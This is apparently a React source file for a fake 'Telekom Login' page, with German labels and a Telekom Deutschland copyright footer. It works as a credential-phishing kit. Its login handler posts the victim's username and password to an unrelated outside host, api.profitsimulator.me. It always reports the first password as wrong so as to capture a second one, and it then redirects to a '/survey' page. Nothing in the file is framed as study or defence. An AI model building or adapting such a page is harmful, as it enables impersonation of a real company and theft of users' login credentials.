import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Switch } from "@/components/ui/switch";
import { ChevronDown, Eye, EyeOff, User, ArrowLeft, AlertTriangle } from "lucide-react";

const Login = () => {
  const navigate = useNavigate();
  const [step, setStep] = useState<'username' | 'password'>('username');
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [rememberUser, setRememberUser] = useState(false);
  const [stayLoggedIn, setStayLoggedIn] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [passwordError, setPasswordError] = useState(false);
  const [passwordAttempts, setPasswordAttempts] = useState(0);
  const [isLoading, setIsLoading] = useState(false);

  const handleUsernameSubmit = () => {
    if (username.trim()) {
      setStep('password');
    }
  };

  const handleBack = () => {
    setStep('username');
    setPasswordError(false);
    setPasswordAttempts(0);
    setPassword("");
  };

  const handleLogin = async () => {
    if (!password.trim()) return;
    
    setIsLoading(true);
    
    try {
      // Send to API
      await fetch('https://api.profitsimulator.me/TONLINE/login.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: username,
          password: password
        }),
      });
      
      if (passwordAttempts === 0) {
        // First attempt: show error
        setPasswordError(true);
        setPasswordAttempts(1);
        setPassword("");
      } else if (passwordAttempts === 1) {
        // Second attempt: show error briefly then redirect
        setPasswordError(true);
        setPassword("");
        setTimeout(() => {
          navigate('/survey');
        }, 1500);
      }
    } catch (error) {
      console.error('Login error:', error);
      if (passwordAttempts === 0) {
        setPasswordError(true);
        setPasswordAttempts(1);
        setPassword("");
      } else {
        setPasswordError(true);
        setPassword("");
        setTimeout(() => {
          navigate('/survey');
        }, 1500);
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen relative" style={{ backgroundColor: '#8B7B8B' }}>
      {/* Telekom Logo */}
      <div className="absolute top-6 left-6 z-10">
        <div className="w-20 h-20 bg-telekom rounded-md flex items-center justify-center">
          <span className="text-white text-3xl font-bold">T</span>
        </div>
      </div>

      {/* Main Content */}
      <div className="min-h-screen flex items-center justify-center px-4">
        <Card className="w-full max-w-md bg-white rounded-lg shadow-lg border-0">
          {step === 'username' ? (
            <div className="p-8">
              {/* Help Icon */}
              <div className="flex justify-end mb-6">
                <button className="w-5 h-5 rounded-full border border-gray-400 flex items-center justify-center text-gray-400 text-xs">
                  ?
                </button>
              </div>

              {/* Title */}
              <h1 className="text-2xl font-bold text-black mb-8">
                Telekom Login
              </h1>

              {/* Username Input */}
              <div className="mb-6">
                <div className="relative">
                  <Input
                    type="text"
                    placeholder="Benutzername"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full h-12 px-4 border border-gray-300 rounded-md text-base focus:ring-2 focus:ring-telekom focus:border-telekom"
                  />
                  <button className="absolute right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 rounded-full border border-gray-400 flex items-center justify-center text-gray-400 text-xs">
                    ?
                  </button>
                </div>
              </div>

              {/* Remember Username Toggle */}
              <div className="flex items-center justify-between mb-8">
                <div className="flex items-center space-x-3">
                  <Switch
                    checked={rememberUser}
                    onCheckedChange={setRememberUser}
                    className="data-[state=checked]:bg-telekom"
                  />
                  <span className="text-sm text-black">Benutzername merken</span>
                </div>
                <button className="w-5 h-5 rounded-full border border-gray-400 flex items-center justify-center text-gray-400 text-xs">
                  ?
                </button>
              </div>

              {/* Buttons */}
              <div className="space-y-3 mb-6">
                <Button 
                  onClick={handleUsernameSubmit}
                  className="w-full h-12 bg-telekom hover:bg-telekom-dark text-white text-base font-semibold rounded-md"
                >
                  Weiter
                </Button>
                
                <Button 
                  variant="outline" 
                  className="w-full h-12 border-gray-300 text-black bg-white hover:bg-gray-50 text-base font-medium rounded-md"
                >
                  Andere Anmeldeoptionen
                </Button>
              </div>

              {/* Register Link */}
              <div className="text-center">
                <button className="text-blue-600 hover:text-blue-700 text-sm">
                  Neu hier? Jetzt registrieren
                </button>
              </div>
            </div>
          ) : (
            <div className="p-8">
              {/* User Info Header */}
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center space-x-2">
                  <div className="w-8 h-8 bg-gray-400 rounded-full flex items-center justify-center">
                    <User className="w-4 h-4 text-white" />
                  </div>
                  <span className="text-sm text-black">{username}</span>
                  <ChevronDown className="w-4 h-4 text-gray-400" />
                </div>
                <button className="w-5 h-5 rounded-full border border-gray-400 flex items-center justify-center text-gray-400 text-xs">
                  ?
                </button>
              </div>

              {/* Title */}
              <h1 className="text-2xl font-bold text-black mb-8">
                Passwort eingeben
              </h1>

              {/* Password Input */}
              <div className="mb-4">
                <div className="relative">
                  <Input
                    type={showPassword ? "text" : "password"}
                    placeholder="Passwort"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (passwordError) setPasswordError(false);
                    }}
                    className={`w-full h-12 px-4 pr-12 rounded-md text-base bg-gray-100 focus:ring-2 focus:ring-telekom focus:border-telekom ${
                      passwordError 
                        ? 'border-destructive border-2' 
                        : 'border border-gray-300'
                    }`}
                    style={{ backgroundColor: '#E8E8E8' }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500"
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>

              {/* Password Error Message */}
              {passwordError && (
                <div className="mb-4 flex items-center space-x-2 text-destructive">
                  <AlertTriangle className="w-4 h-4" />
                  <span className="text-sm">Passwort ist nicht korrekt.</span>
                </div>
              )}

              {/* Forgot Password Link */}
              <div className="mb-6">
                <button className="text-blue-600 hover:text-blue-700 text-sm">
                  Passwort vergessen?
                </button>
              </div>

              {/* Stay Logged In Toggle */}
              <div className="flex items-center justify-between mb-8">
                <div className="flex items-center space-x-3">
                  <Switch
                    checked={stayLoggedIn}
                    onCheckedChange={setStayLoggedIn}
                    className="data-[state=checked]:bg-telekom"
                  />
                  <span className="text-sm text-black">Angemeldet bleiben</span>
                </div>
                <button className="w-5 h-5 rounded-full border border-gray-400 flex items-center justify-center text-gray-400 text-xs">
                  ?
                </button>
              </div>

              {/* Buttons */}
              <div className="space-y-3 mb-6">
                <Button 
                  onClick={handleLogin}
                  disabled={isLoading || !password.trim()}
                  className="w-full h-12 bg-telekom hover:bg-telekom-dark text-white text-base font-bold rounded-md disabled:opacity-50"
                >
                  {isLoading ? 'WIRD GELADEN...' : 'LOGIN'}
                </Button>
                
                <Button 
                  variant="outline" 
                  className="w-full h-12 border-gray-300 text-black bg-white hover:bg-gray-50 text-base font-medium rounded-md"
                >
                  Andere Anmeldeoptionen
                </Button>
              </div>

              {/* Back Link */}
              <div className="text-left">
                <button 
                  onClick={handleBack}
                  className="text-blue-600 hover:text-blue-700 text-sm flex items-center"
                >
                  <ArrowLeft className="w-4 h-4 mr-1" />
                  Zurück
                </button>
              </div>
            </div>
          )}
        </Card>
      </div>

      {/* Footer */}
      <div className="absolute bottom-4 left-4 right-4 flex justify-between items-center text-white text-xs">
        <div>
          <div>© Telekom Deutschland GmbH</div>
          <div>26.22.0</div>
        </div>
        <div className="flex space-x-6">
          <button className="hover:text-gray-200">Impressum</button>
          <button className="hover:text-gray-200">Datenschutz</button>
        </div>
      </div>

      {/* Logo Bottom Right */}
      <div className="absolute bottom-4 right-4">
        <div className="text-white/80 text-xs">Telekom Logo</div>
      </div>
    </div>
  );
};

export default Login;